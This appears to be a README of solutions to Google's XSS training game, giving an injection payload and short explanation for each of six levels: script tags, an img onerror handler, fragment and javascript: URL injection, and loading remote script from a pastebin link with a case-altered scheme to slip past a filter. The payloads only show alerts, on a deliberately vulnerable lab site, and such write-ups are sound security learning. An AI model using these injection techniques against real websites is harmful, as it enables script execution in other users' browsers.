# xss-game
---
  https://xss-game.appspot.com/
  
  Hello there, thank you sooo much for reading! :) 
  Here are my solutions to the google xss game.
  I've noticed that some challenges don't work out with every browser, so try it with multiple ones.

---
 
## Level1: Hello, world of XSS

Solution: `<script> alert("hi") </script> `

- Simply set a new `<script>` tag containing the alert.

---

## Level2: Persistence is key

Solution: `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`

- I've XSS'ed it through posting a not available image.
- Onerror means if the picture is not available it runs the code.
- The String.fromCharCode creates the word "XSS" from charcode.
  (88=X 83=S)

---

## Level3: That sinking feeling...

Solution: http://xss-game.appspot.com/level3/frame#1`' onerror="alert('XSS')"`

- In this challenge you're only able to XSS the URL bar.
- It's not working with every browser! -> chrome worked out 
- I've added a ' to make the frame#1 unaccessable so the onerror alert gets run.

---

## Level4: Context matters

Solution: `');alert('xss`

- Escape the function with ');
- call the new alert with ('xss

---

## Level5: Breaking protocol

Solution: `http://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("XSS")`

- First press signup.
- Replace the vulnerable url with the one from the solution.
- Press next so the js code gets run.

---

## Level6: Follow the white rabbit

Solution: `http://xss-game.appspot.com/level6/frame#hTTP://pastebin.com/raw/ycjGCXDY`

- open pastebin.com and paste: alert("XSS");
- Next get the raw link of your XSS file.
- Now add the link to the vulnerable url and modify the http, so it won't get recognised. 


